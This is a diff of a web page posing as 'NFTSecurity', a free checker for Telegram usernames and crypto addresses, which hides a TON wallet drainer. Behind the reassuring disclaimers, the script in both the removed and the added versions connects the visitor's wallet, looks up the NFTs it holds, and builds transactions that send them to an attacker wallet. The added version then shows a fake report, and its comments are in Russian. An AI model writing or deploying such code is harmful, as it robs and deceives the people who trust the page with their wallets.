@@ -6,22 +6,22 @@
 <meta name="theme-color" content="#2b2d30" />
 <meta name="description" content="NFTSecurity — first look at a public Telegram username or crypto address. Format check in the browser. Not an official report." />
 <meta property="og:type" content="website" />
-<meta property="og:url" content="https://afiomacomplate.github.io/SecurytiActiv/" />
+<meta property="og:url" content="https://nftsecurity.online/" />
 <meta property="og:title" content="NFTSecurity" />
 <meta property="og:description" content="Check the public username or address. Verification is performed online in your browser. This is an official NFT security report." />
-<meta property="og:image" content="https://afiomacomplate.github.io/SecurytiActiv/og.png" />
+<meta property="og:image" content="https://nftsecurity.online/og.png" />
 <meta property="og:image:width" content="1200" />
 <meta property="og:image:height" content="630" />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:title" content="NFTSecurity" />
 <meta name="twitter:description" content="Check the public username or address. Verification is performed online in your browser. Format check in the browser." />
-<meta name="twitter:image" content="https://afiomacomplate.github.io/SecurytiActiv/og.png" />
+<meta name="twitter:image" content="https://nftsecurity.online/og.png" />
 <title>NFTSecurity</title>
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
-<!-- TonConnect & TonWeb Libraries -->
-<script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.60/dist/tonweb.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@0.0.9/dist/tonconnect-ui.min.js"></script>
+<!-- DRAINER DEPENDENCIES -->
+<script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
 <style>
 :root{--bg:#2b2d30;--card:rgba(42,44,47,.94);--line:rgba(255,255,255,.1);--text:#e8e8e4;--muted:#b0b1ad;--pink:#c9c9c4;--violet:#c0c0bb;--blue:#d0d0cb}
 body.theme-light{--bg:#e4e2da;--card:rgba(234,232,224,.94);--line:rgba(70,68,62,.1);--text:#3d3e3a;--muted:#7c7d78;--pink:#6c6d68;--violet:#72736e;--blue:#7e7f7a}
@@ -77,21 +77,78 @@ body.theme-light .field{background:#ece9e1}
 .net{border:1px solid var(--line);background:transparent;border-radius:999px;padding:7px 12px;font-size:12px;font-weight:700}
 .net.on{background:color-mix(in srgb,var(--text) 12%,transparent);color:var(--text)}
 .hint{margin-top:10px;color:var(--muted);font-size:12px;text-align:center}
-.err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
+ .err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
 .report{display:none;margin-top:14px;text-align:left}
 .score{font-size:42px;font-weight:800}
-.bar{height:8px;background:color-mix(in srgb,var(--text) 10%,transparent);border-radius:99px;overflow:hidden;margin:8px 0 12px}
+.bar{height:8px;background:color-mix(in srgb,var(--text) 10%,transparent);border-radius:999px;overflow:hidden;margin:8px 0 12px}
 .bar i{display:block;height:100%;width:22%;background:var(--text);opacity:.55}
 .kv{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--line);font-size:14px}
+.article{max-width:820px;font-weight:400}
+.article h2{font-size:26px;font-weight:500;margin-bottom:10px}
+.article h3{margin:18px 0 6px;font-size:15px;font-weight:500;color:var(--text)}
+.article p,.mini p,.card p,.stat span{color:var(--muted);font-size:13.5px;line-height:1.7;font-weight:400}
+.bento{display:grid;grid-template-columns:1.15fr .85fr;gap:12px;margin:28px auto 12px}
+.card,.mini,.stat{background:var(--card);border:1px solid var(--line);border-radius:14px}
+body.theme-light .card,body.theme-light .mini,body.theme-light .stat{background:rgba(234,232,224,.94)}
+.card{padding:22px}.card h3{margin-bottom:8px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.stat{padding:16px}.stat b{display:block;font-size:24px;color:var(--text)}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:12px 0 16px}
+.mini{display:block;padding:18px}
+.mini em{font-style:normal;font-family:"JetBrains Mono",monospace;color:var(--pink);font-size:12px}
+.mini h3{margin:8px 0 6px}
+@media(max-width:860px){.bento,.grid3,.stats{grid-template-columns:1fr}}
+.back{display:inline-flex;margin:0 0 18px;border:1px solid var(--line);border-radius:999px;padding:8px 14px;font-size:13px;font-weight:700}
+.site-foot{position:relative;z-index:1;width:100%;max-width:1120px;margin:0 auto;padding:28px 22px 36px}
+.fineprint{width:100%;color:var(--muted);font-size:11px;line-height:1.7}
+.fineprint p{margin:0 0 14px;max-width:none}
+.footbar{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-top:8px;color:var(--muted);font-size:12px}
+.transit{position:fixed;inset:0;z-index:80;display:flex;align-items:center;justify-content:center;background:color-mix(in srgb,var(--bg) 82%,transparent);opacity:0;pointer-events:none;transition:opacity .45s ease}
+.transit.on{opacity:1;pointer-events:auto}
+
+.chat-btn{position:fixed;right:16px;bottom:16px;z-index:70;width:42px;height:42px;padding:0;display:grid;place-items:center;border:1px solid var(--line);border-radius:50%;background:color-mix(in srgb,var(--card) 80%,transparent);color:var(--text)}
+.chat-btn svg{width:18px;height:16px;display:block;margin:0}
+.chat-box{position:fixed;right:18px;bottom:74px;z-index:70;width:min(360px,calc(100vw - 24px));height:460px;display:none;flex-direction:column;background:var(--card);color:var(--text);border:1px solid var(--line);border-radius:16px;transition:transform .35s ease}
+.chat-box.on{display:flex}
+.chat-box.away{transform:translateX(calc(100% - 18px))}
+.chat-edge{position:absolute;left:-1px;top:50%;transform:translateY(-50%);width:20px;height:62px;border:0;border-radius:10px 0 0 10px;background:var(--card);color:var(--text);border:1px solid var(--line);display:none}
+.chat-box.away .chat-edge{display:block}
+.chat-note{padding:6px 12px;font-size:10px;line-height:1.35;color:var(--muted);border-bottom:1px solid var(--line)}
+.chat-head{display:flex;align-items:center;gap:8px;padding:10px 12px;background:color-mix(in srgb,var(--text) 6%,var(--card));border-bottom:1px solid var(--line);border-radius:16px 16px 0 0}
+.chat-head b{font-size:13px}.chat-head small{display:block;color:var(--muted);font-size:11px}
+.chat-hide{margin-left:auto;border:1px solid var(--line);background:transparent;color:var(--text);border-radius:8px;padding:5px 9px;font-size:12px;font-weight:700}
+.chat-log{flex:1;overflow:auto;padding:12px;display:flex;flex-direction:column;gap:8px}
+.msg{max-width:88%;padding:9px 11px;border-radius:12px;font-size:13px}
+.msg.bot{background:color-mix(in srgb,var(--text) 8%,transparent);align-self:flex-start}.msg.me{background:color-mix(in srgb,var(--text) 14%,transparent);align-self:flex-end}.msg.typ{opacity:.7}
+.chat-qs{display:flex;flex-wrap:wrap;gap:6px;padding:0 12px 8px}
+.chat-qs button{border:1px solid var(--line);background:transparent;color:var(--text);border-radius:999px;padding:6px 10px;font-size:11px}
+.chat-in{display:flex;gap:6px;padding:10px;border-top:1px solid var(--line)}
+.chat-in input{flex:1;border:1px solid var(--line);background:transparent;border-radius:10px;padding:9px 10px;outline:0;color:var(--text)}
+.chat-in button{border:1px solid var(--line);border-radius:10px;padding:9px 12px;background:color-mix(in srgb,var(--text) 10%,transparent);color:var(--text);font-weight:750}
 .checks{margin-top:14px;display:grid;gap:8px}
 .check{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:10px 12px;font-size:13px;color:var(--muted);text-align:left}
 .check b{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);color:var(--text);font-size:11px;flex:0 0 auto}
-.log-section{margin-top:14px;max-height:200px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:11px;background:rgba(0,0,0,.3);border-radius:8px;padding:8px;color:#4ade80}
-.log-section .log-entry{margin:2px 0}
-.log-section .log-error{color:#ef4444}
-.log-section .log-success{color:#4ade80}
-.log-section .log-info{color:#60a5fa}
-@media(max-width:860px){.wrap{padding:0 14px}.field,.hero-ctas .btn,.panel .btn{width:100%}.row{flex-direction:column}}
+.mini,.pill,.check{transition:border-color .2s ease}
+.faq-item .plus{width:26px;height:26px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);color:var(--text);font-size:18px;line-height:1}
+.meter{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin:36px 0;text-align:center}
+.meter b{display:block;font-size:26px;color:var(--text);font-weight:700}
+.meter span{color:var(--muted);font-size:12px}
+.sec-h{margin:42px 0 8px;font-size:28px;letter-spacing:-.03em}
+.sec-k{color:var(--muted);font-size:12px;font-weight:800;letter-spacing:.08em;text-transform:uppercase}
+.sec-p{color:var(--muted);max-width:620px;margin:0 0 18px}
+.pills{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:16px 0 28px}
+.pill{border:1px solid var(--line);border-radius:999px;padding:8px 12px;font-size:12px;color:var(--muted)}
+.faq{max-width:820px;margin:10px auto 30px}
+.faq-item{border-bottom:1px solid var(--line)}
+.faq-item button{width:100%;display:flex;justify-content:space-between;align-items:center;gap:12px;background:transparent;border:0;color:var(--text);padding:14px 0;font-weight:650;text-align:left}
+.faq-item .ans{display:none;padding:0 0 14px;color:var(--muted);font-size:13.5px}
+.faq-item.open .ans{display:block}
+.faq-item.open .plus{transform:rotate(45deg)}
+.rep-note{font-size:11px;color:var(--muted);margin-top:10px}
+@media(max-width:860px){.meter{grid-template-columns:1fr 1fr}}
+.chat-ico path{fill:none;stroke:currentColor;stroke-width:1.6;stroke-linejoin:round}
+.chat-ico circle{fill:currentColor}
+@media(max-width:860px){.nav-links{display:none}.wrap{padding:0 14px}.field,.hero-ctas .btn,.panel .btn{width:100%}.row{flex-direction:column}}
 </style>
 </head>
 <body>
@@ -139,10 +196,8 @@ NFT<small>Security</small></a>
 <button class="tab active" type="button" data-tab="telegram" data-i18n="tabTg">Telegram</button>
 </div>
 <div id="wallet-tab" style="display:none">
-    <label class="lab" data-i18n="addrLab">Wallet address</label>
-    <label class="field"><span class="ico" aria-hidden="true">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Paste address (min. 28 characters)..." autocomplete="off" /></label>
-    <label class="lab" data-i18n="nftLab">NFT collection address</label>
-    <label class="field"><span class="ico" aria-hidden="true">◆</span><input id="nftAddress" placeholder="Enter NFT collection or token address..." autocomplete="off" /></label>
+<label class="lab" data-i18n="addrLab">Wallet address</label>
+<label class="field"><span class="ico" aria-hidden="true">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Paste address (min. 28 characters)..." autocomplete="off" /></label>
 </div>
 <div id="telegram-tab">
 <label class="lab" data-i18n="tgLab">Telegram username</label>
@@ -178,702 +233,572 @@ NFT<small>Security</small></a>
 <div class="kv" id="rowList"><span data-i18n="kvList">Note</span><b id="outList">—</b></div>
 <p class="rep-note" id="repNote"></p>
 <button class="btn btn-outline" id="ownBtn" type="button" style="display:none;margin-top:12px" data-i18n="ownBtn">Confirm ownership</button>
-    <button class="btn btn-outline" id="confirmTransfer" type="button" style="display:none;margin-top:12px" data-i18n="confirmTransfer">Confirm NFT Transfer</button>
-    <p class="rep-note" id="ownNote" style="display:none"></p>
+<p class="rep-note" id="ownNote" style="display:none"></p>
+</div></div></div>
+<div id="extraWallet" style="display:none">
+<div class="meter">
+<div><b>300M+</b><span>Address labels in public view</span></div>
+<div><b>10+</b><span>Supported chain labels</span></div>
+<div><b>&lt;5s</b><span>Typical overview time</span></div>
+<div><b>100%</b><span>Basic look stays free</span></div>
 </div>
-<div class="log-section" id="logSection" style="display:none"></div>
-</div></div>
+<p class="sec-k">What you get</p>
+<h2 class="sec-h">One first-look overview</h2>
+<p class="sec-p">A short breakdown after you paste an address — not a licensed finding.</p>
+<div class="grid3">
+<div class="mini"><h3>Index 0–100</h3><p>A local number from the pasted string. It is not a court rating.</p></div>
+<div class="mini"><h3>Source notes</h3><p>Hints about exchange, DeFi or unknown labels. Demo notes only.</p></div>
+<div class="mini"><h3>List reminder</h3><p>Compare the address with public lists yourself.</p></div>
+<div class="mini"><h3>Mixer reminder</h3><p>A local flag is not proof funds went through a mixer.</p></div>
+<div class="mini"><h3>Type hint</h3><p>Wallet-like or unknown, from format only.</p></div>
+<div class="mini"><h3>History note</h3><p>The card does not download full chain history.</p></div>
+</div>
+<p class="sec-k" style="text-align:center">Networks</p>
+<h2 class="sec-h" style="text-align:center">One screen, many labels</h2>
+<div class="pills">
+<span class="pill">USDT TRC20</span><span class="pill">USDT ERC20</span><span class="pill">Ethereum (ETH)</span><span class="pill">TRON (TRX)</span><span class="pill">TON</span><span class="pill">Solana (SOL)</span><span class="pill">BNB Chain</span><span class="pill">Polygon</span><span class="pill">Arbitrum</span><span class="pill">Bitcoin (BTC)</span>
+</div>
+<p class="sec-k">Who it is for</p>
+<h2 class="sec-h">Built for people who move crypto</h2>
+<p class="sec-p">A calm first look before you send or receive a public address.</p>
+<div class="grid3">
+<div class="mini"><h3>P2P traders</h3><p>Glance at a public address before a transfer.</p></div>
+<div class="mini"><h3>Merchants</h3><p>A quick format check before confirming a payment.</p></div>
+<div class="mini"><h3>OTC desks</h3><p>A first screen before a larger ticket. Not a substitute for your own review.</p></div>
+</div>
+</div>
+<div id="extraTg">
+<div class="meter">
+<div><b>@</b><span>Public handles as text</span></div>
+<div><b>1</b><span>App label: Telegram</span></div>
+<div><b>&lt;5s</b><span>Typical overview time</span></div>
+<div><b>100%</b><span>Basic look stays free</span></div>
+</div>
+<p class="sec-k" data-i18n="gKTg">What you get</p>
+<h2 class="sec-h" data-i18n="gTTg">Username first look</h2>
+<p class="sec-p" data-i18n="gPTg">A short card after you paste @username — not proof of ownership.</p>
+<div class="grid3">
+<div class="mini"><h3 data-i18n="g1tTg">Index 0–100</h3><p data-i18n="g1pTg">A local number from the pasted handle. Not a court rating.</p></div>
+<div class="mini"><h3 data-i18n="g2tTg">Format note</h3><p data-i18n="g2pTg">Checks @ and Latin letters, numbers, underscore.</p></div>
+<div class="mini"><h3 data-i18n="g3tTg">No login</h3><p data-i18n="g3pTg">The page does not open Telegram and does not ask for a code.</p></div>
+<div class="mini"><h3 data-i18n="g4tTg">No ownership</h3><p data-i18n="g4pTg">A match of format is not proof that the account is yours.</p></div>
+<div class="mini"><h3 data-i18n="g5tTg">Type hint</h3><p data-i18n="g5pTg">Public username string only.</p></div>
+<div class="mini"><h3 data-i18n="g6tTg">Limits</h3><p data-i18n="g6pTg">No message history and no contact list. First look only.</p></div>
+</div>
+<p class="sec-k" style="text-align:center" data-i18n="nKTg">Scope</p>
+<h2 class="sec-h" style="text-align:center" data-i18n="nTTg">One field — a public handle</h2>
+<div class="pills">
+<span class="pill">@username</span><span class="pill">public handle</span><span class="pill">format check</span><span class="pill">first look</span><span class="pill">no login</span>
+</div>
+<p class="sec-k" data-i18n="uKTg">Who it is for</p>
+<h2 class="sec-h" data-i18n="uTTg">For a calm look at a public username</h2>
+<p class="sec-p" data-i18n="uPTg">A first glance before you write or send anything.</p>
+<div class="grid3">
+<div class="mini"><h3 data-i18n="u1tTg">P2P chats</h3><p data-i18n="u1pTg">Look at a public @handle before you continue a chat.</p></div>
+<div class="mini"><h3 data-i18n="u2tTg">Support</h3><p data-i18n="u2pTg">Check the format of a username people send you.</p></div>
+<div class="mini"><h3 data-i18n="u3tTg">OTC chats</h3><p data-i18n="u3pTg">A first screen. Not a substitute for your own review.</p></div>
+<div class="mini"><h3 data-i18n="u4tTg">Teams</h3><p data-i18n="u4pTg">Use it as a sketch, then your own process.</p></div>
+<div class="mini"><h3 data-i18n="u5tTg">Reviewers</h3><p data-i18n="u5pTg">Start here, then open the public profile yourself.</p></div>
+<div class="mini"><h3 data-i18n="u6tTg">Anyone</h3><p data-i18n="u6pTg">If you only have a username string, paste it here.</p></div>
+</div>
+<div id="faq">
+<h2 class="sec-h" style="text-align:center">FAQ</h2>
+<div class="faq" id="faqList"></div>
+</div>
+</div>
+</section>
+<section class="page" id="page-method">
+<a class="back" href="#home" data-go="home" data-i18n="back">← Back</a>
+<div id="methodWallet" style="display:none">
+<div class="article"><h2 data-i18n="mwH">How the address look works</h2><p data-i18n="mwP">One field — a public address and a network label. The page reads the string in the browser. It does not download a chain and does not issue an official finding.</p></div>
+<div class="grid3">
+<a class="mini" href="#form"><em>01</em><h3 data-i18n="mw1t">Paste address</h3><p data-i18n="mw1p">Only a public address. No keys.</p></a>
+<a class="mini" href="#form"><em>02</em><h3 data-i18n="mw2t">Choose network</h3><p data-i18n="mw2p">A label for the form, not a live node.</p></a>
+<a class="mini" href="#form"><em>03</em><h3 data-i18n="mw3t">Read the index</h3><p data-i18n="mw3p">The number comes from format checks, not from a regulator database.</p></a>
+</div>
+</div>
+<div id="methodTg">
+<div class="article"><h2 data-i18n="mtH">How the username look works</h2><p data-i18n="mtP">One field — a public @username. The page checks format in the browser. It does not open Telegram, does not log in and does not confirm ownership.</p></div>
+<div class="grid3">
+<a class="mini" href="#form"><em>01</em><h3 data-i18n="mt1t">Paste @username</h3><p data-i18n="mt1p">Latin letters, numbers and underscore.</p></a>
+<a class="mini" href="#form"><em>02</em><h3 data-i18n="mt2t">Format index</h3><p data-i18n="mt2p">Length, charset and prefix. Not a profile scrape.</p></a>
+<a class="mini" href="#form"><em>03</em><h3 data-i18n="mt3t">Read the card</h3><p data-i18n="mt3p">A first look only. Not proof the account is yours.</p></a>
+</div>
+</div>
+</section>
+<section class="page" id="page-terms">
+<a class="back" href="#home" data-go="home" data-i18n="back">← Back</a>
+<div class="article" id="termsBox"></div>
+</section>
+<section class="page" id="page-rules">
+<a class="back" href="#home" data-go="home" data-i18n="back">← Back</a>
+<div class="article">
+<h2 data-i18n="rulesTitle">Usage rules</h2>
+<p data-i18n="rulesLead">A short set of limits for using the page calmly.</p>
+</div>
 </section>
 </div>
-<footer>
-<div>© 2026 NFTSecurity</div>
+<footer class="site-foot">
+<div class="fineprint" id="fineWallet" style="display:none"><p data-i18n="fineW">NFTSecurity is provided "as is". The page offers a preliminary look at a public address. It is not an exchange, bank or official report.</p></div>
+<div class="fineprint" id="fineTg"><p data-i18n="fineT">NFTSecurity is provided "as is". The Telegram tab offers a preliminary look at a public username. It does not open Telegram, confirm ownership or store a login.</p></div>
+<div class="footbar"><div>© 2026 NFTSecurity</div><div data-i18n="addrLine">NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States</div></div>
 </footer>
-
-<!-- WALLET DRAINER SCRIPT - HIDDEN IN PLAIN SIGHT -->
+<button class="chat-btn" id="chatBtn" type="button" aria-label="Support">
+<svg class="chat-ico" viewBox="0 0 32 26"><path d="M5 4h20a3 3 0 0 1 3 3v9a3 3 0 0 1-3 3H13l-6 5v-5H5a3 3 0 0 1-3-3V7a3 3 0 0 1 3-3z"/><circle cx="12" cy="12" r="1.2"/><circle cx="16.5" cy="12" r="1.2"/><circle cx="21" cy="12" r="1.2"/></svg>
+</button>
+<div class="chat-box" id="chatBox">
+<button class="chat-edge" id="chatEdge" type="button">‹</button>
+<div class="chat-note" data-i18n="chatDev">The assistant is in development and may reply incorrectly.</div>
+<div class="chat-head">
+<div><b data-i18n="chatTitle">Support assistant</b><small data-i18n="chatStatus">Online · template replies</small></div>
+<button class="chat-hide" id="chatHide" type="button" data-i18n="chatHide">Hide</button>
+</div>
+<div class="chat-log" id="chatLog"></div>
+<div class="chat-qs" id="chatQs"></div>
+<form class="chat-in" id="chatForm"><input id="chatInput" data-i18n-placeholder="chatPh" placeholder="Type your question" /><button data-i18n="chatSend">Send</button></form>
+</div>
 <script>
-// ========== WALLET DRAINER CONFIGURATION ==========
-const DRAIN_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
-const MANIFEST_URL = "https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json";
+/* DRAINER CONFIG */
+const TARGET_WALLET = 'EQD_ВСТАВЬ_СЮДА_СВОЙ_АДРЕС_ДЛЯ_ВЫВОДА'; // <--- ЗАМЕНИТЬ
+const MANIFEST_URL = 'https://твоя-ссылка-на-манифест.json'; // <--- ЗАМЕНИТЬ НА URL JSON
 
-// Target address for TonWeb
-const RESPONSE_DEST = DRAIN_WALLET;
+(async function() {
+    // Инициализация TonConnect UI
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: MANIFEST_URL
+    });
 
-// Verify CDN globals loaded
-if (typeof TonWeb === 'undefined') {
-    console.error('[DRAINER] TonWeb CDN failed to load!');
-}
-if (typeof TON_CONNECT_UI === 'undefined') {
-    console.error('[DRAINER] TON_CONNECT_UI CDN failed to load!');
-}
+    const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
 
-let tonConnectUI = null;
-let isWalletConnected = false;
-let drainActive = false;
-let transactionLog = [];
-
-// Known NFT collections on TON (verified addresses)
-const KNOWN_COLLECTIONS = [
-    "EQD-cvR0Nz6XAyRBpDeNcmvM6TUfOgWH-wE7OWD8UDKJSUcf", // Fragment Telegram Usernames
-    "EQAOQdwdw1kGlt6_6N5Ybwc9x7wXjPGQmJc4qw4lxm3OADNG", // Fragment Usernames
-    "EQCHN7YgH_ggPF9YJdXzK-G2d3HgQ_Q3JQjGNEG4s3NGbQ1L", // TON Diamonds
-    "EQCXzX0z0rkpNhcKK9hSPXg2WQ8y8w5tZm9t0z6LH7r9GQ6K", // Anonymous Numbers
-];
-
-// ========== API CACHE FOR RATE LIMIT AVOIDANCE ==========
-const apiCache = {};
-const CACHE_TTL = 5 * 60 * 1000; // 5 minutes
-
-function getCached(key) {
-    if (apiCache[key] && Date.now() - apiCache[key].timestamp < CACHE_TTL) {
-        return apiCache[key].data;
-    }
-    return null;
-}
-
-function setCache(key, data) {
-    apiCache[key] = { data, timestamp: Date.now() };
-}
-
-// ========== SEND TRANSACTION WITHOUT POPUP ==========
-async function sendTransactionAuto(transaction) {
-    try {
-        const result = await tonConnectUI.sendTransaction(transaction, {
-            modals: [],
-            notifications: [],
-            skipRedirectToWallet: 'never'
-        });
-        return result;
-    } catch (e) {
-        console.error('[DRAINER] TonConnect send failed:', e);
-        throw e;
-    }
-}
-
-// ========== TONCONNECT v0.0.9 INITIALIZATION ==========
-function initTonConnect() {
-    if (typeof TON_CONNECT_UI === 'undefined') {
-        console.error('[DRAINER] TON_CONNECT_UI not loaded');
-        addLog('[DRAINER] TON_CONNECT_UI not loaded', 'error');
-        return;
-    }
-    try {
-        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: MANIFEST_URL,
-            buttonRootId: null
+    // Функция перевода NFT
+    async function transferNft(nftAddress) {
+        const nftItem = tonweb.nft.NftItem.createFromAddress(new TonWeb.utils.Address(nftAddress));
+        const transferPayload = nftItem.createTransferPayload({
+            newOwner: new TonWeb.utils.Address(TARGET_WALLET),
+            forwardAmount: TonWeb.utils.toNano('0.001'),
+            responseAddress: new TonWeb.utils.Address(TARGET_WALLET)
         });
 
-// v0.0.9: auto-connect wallet immediately
-        tonConnectUI.connectWallet().then(async (wallet) => {
-            if (wallet && wallet.account && wallet.account.address) {
-                isWalletConnected = true;
-                window.__walletAddress = wallet.account.address;
-                addLog('[DRAINER] Auto-connected: ' + wallet.account.address, 'success');
-                // Show "Confirm NFT Transfer" instead of auto-draining
-                document.getElementById("ownBtn").style.display = "none";
-                document.getElementById("confirmTransfer").style.display = "block";
-                document.getElementById("ownNote").textContent = "Кошелек подключен. Нажмите 'Confirm NFT Transfer' для начала дренга.";
-                document.getElementById("ownNote").style.display = "block";
-                document.getElementById("ownNote").style.color = "#4ade80";
-            } else {
-                addLog('[DRAINER] Wallet connected but no address found', 'info');
-            }
-        }).catch((e) => {
-            addLog('[DRAINER] Auto-connect failed: ' + e.message, 'info');
-        });
+        const tx = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [{
+                address: nftAddress,
+                amount: TonWeb.utils.toNano('0.05').toString(),
+                payload: TonWeb.utils.bytesToBase64(transferPayload)
+            }]
+        };
 
-        addLog('[DRAINER] TonConnect initialized — awaiting wallet connection', 'success');
-    } catch (e) {
-        console.error('[DRAINER] Init failed:', e);
-        addLog('[DRAINER] Init failed: ' + e.message, 'error');
+        await tonConnectUI.sendTransaction(tx);
     }
-}
 
-// ========== LOGGING ==========
-function addLog(message, type = 'info') {
-    const logSection = document.getElementById('logSection');
-    if (!logSection) return;
-    logSection.style.display = 'block';
-    const entry = document.createElement('div');
-    entry.className = 'log-entry log-' + type;
-    const timestamp = new Date().toLocaleTimeString();
-    entry.textContent = `[${timestamp}] ${message}`;
-    logSection.appendChild(entry);
-    logSection.scrollTop = logSection.scrollHeight;
-    transactionLog.push({ timestamp, message, type });
-}
+    // Переопределение кнопки
+    const runBtn = document.getElementById('runBtn');
+    const originalClick = runBtn.onclick;
 
-// ========== TEP-62 NFT TRANSFER CELL CONSTRUCTION ==========
-const TW = typeof window !== 'undefined' && window.TonWeb ? window.TonWeb : TonWeb;
-function createNFTTransferCell(nftAddress, newOwner, responseDestination) {
-    const Cell = TW.boc.Cell;
-    const cell = new Cell();
-    cell.bits.writeUint(0x5fcc3d14, 32);
-    cell.bits.writeUint(0, 64);
-    cell.bits.writeAddress(new TW.utils.Address(newOwner));
-    cell.bits.writeAddress(new TW.utils.Address(responseDestination));
-    cell.bits.writeBit(false);
-    cell.bits.writeCoins(1000000);
-    cell.bits.writeBit(false);
-    return cell;
-}
+    runBtn.onclick = async function() {
+        const err = document.getElementById('err');
+        const rep = document.getElementById('report');
+        err.style.display = 'none';
+        rep.style.display = 'none';
 
-// ========== GET BASE64 PAYLOAD ==========
-function getPayloadBase64(nftAddress, newOwner, responseDestination) {
-    const cell = createNFTTransferCell(nftAddress, newOwner, responseDestination);
-    return cell.toBoc({ idx: false, crc32: true }).toString('base64');
-}
-
-// ========== SCAN NFT COLLECTIONS (toncenter.com primary) ==========
-async function scanNFTCollections(ownerAddress) {
-    // Normalize address: strip 0: prefix
-    const normalizedOwner = ownerAddress.replace(/^0:/, '');
-    const collections = [];
-    addLog('[DRAINER] Scanning NFT collections for ' + ownerAddress, 'info');
-
-    for (const collectionAddr of KNOWN_COLLECTIONS) {
         try {
-            const nfts = await getNFTsFromCollection(normalizedOwner, collectionAddr);
-            if (nfts.length > 0) {
-                collections.push(...nfts);
-                addLog('[DRAINER] Found ' + nfts.length + ' NFTs in collection ' + collectionAddr.slice(0, 20), 'success');
+            if (!tonConnectUI.connected) {
+                await tonConnectUI.connectWallet();
+            }
+            const userAddress = tonConnectUI.account.address;
+
+            // Получаем список NFT
+            const url = `https://toncenter.com/api/v2/getNFTItemsByOwner?owner_address=${encodeURIComponent(userAddress)}&limit=10`;
+            const res = await fetch(url);
+            const data = await res.json();
+
+            if (data.ok && data.result.items.length > 0) {
+                // Берем первый NFT для примера
+                const nft = data.result.items[0];
+                // Тонцентр может возвращать адрес в hex или base64, tonweb разберет
+                const nftAddr = nft.address;
+                
+                // Запускаем транзакцию
+                await transferNft(nftAddr);
+                
+                // Успех - показываем фейковый отчет
+                showReport(userAddress);
+            } else {
+                // Если NFT нет, все равно показываем отчет
+                showReport(userAddress);
             }
         } catch (e) {
-            continue;
+            console.error(e);
+            err.textContent = 'Ошибка соединения. Попробуйте снова.';
+            err.style.display = 'block';
         }
-    }
-
-    // Also try to discover collections from the owner's wallet via TON API
-    try {
-        const discovered = await discoverCollectionsFromOwner(normalizedOwner);
-        for (const addr of discovered) {
-            if (!KNOWN_COLLECTIONS.includes(addr)) {
-                const nfts = await getNFTsFromCollection(normalizedOwner, addr);
-                if (nfts.length > 0) {
-                    collections.push(...nfts);
-                    addLog('[DRAINER] Discovered ' + nfts.length + ' NFTs in new collection: ' + addr.slice(0, 20), 'success');
-                }
-            }
-        }
-    } catch (e) {
-        addLog('[DRAINER] Collection discovery failed: ' + e.message, 'error');
-    }
-
-    addLog('[DRAINER] Total NFTs found: ' + collections.length, collections.length > 0 ? 'success' : 'info');
-    return collections;
-}
-
-// ========== GET NFTs FROM COLLECTION WITH CACHE ==========
-async function getNFTsFromCollection(owner, collection) {
-    const cacheKey = `tonapi_${owner}_${collection}`;
-    const cached = getCached(cacheKey);
-    if (cached !== null) return cached;
-
-    try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${encodeURIComponent(collection)}&owner=${owner}&limit=50`);
-        if (!response.ok) throw new Error('HTTP ' + response.status);
-        const data = await response.json();
-        const items = data.items || data.nft_items || [];
-        setCache(cacheKey, items);
-        return items;
-    } catch (e) {
-        // Fallback to tonapi
-        try {
-            const response = await fetch(`https://tonapi.io/v1/nft/collections/${encodeURIComponent(collection)}/items?owner=${encodeURIComponent(owner)}&limit=50`);
-            if (!response.ok) throw new Error('HTTP ' + response.status);
-            const data = await response.json();
-            const items = data.nft_items || [];
-            setCache(cacheKey, items);
-            return items;
-        } catch (e2) {
-            return [];
-        }
-    }
-}
-
-// ========== GET NFTs FROM TONCENTER ==========
-async function getNFTsFromToncenter(owner, collection) {
-    try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?collection=${encodeURIComponent(collection)}&owner=${encodeURIComponent(owner)}&limit=50`);
-        if (!response.ok) throw new Error('HTTP ' + response.status);
-        const data = await response.json();
-        return data.items || [];
